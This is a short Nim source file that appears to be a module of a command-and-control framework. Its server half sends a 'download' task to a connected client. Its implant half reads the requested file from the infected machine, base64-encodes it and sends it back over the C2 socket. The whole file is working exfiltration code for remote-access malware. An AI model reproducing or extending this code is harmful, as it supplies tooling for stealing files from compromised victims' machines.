when defined(server):
    import asyncdispatch, json
    import ../server/[types, communication]

when defined(client):
    import osproc, os, net, base64
    import ../client/communication

when defined(server):
    proc sendTask*(client: C2Client, path: string) {.async.} =
        let j = %*
            {
                "task": "download",
                "path": path
            }
        await client.sendClientTask($j)

when defined(client):
    proc executeTask*(client: Socket, path: string) =
        try:
            let contents: string = readFile(path)
            client.sendFile(path, encode(contents))
        except IOError:
            client.sendOutput("ERR", "File " & path & " does not exist!") 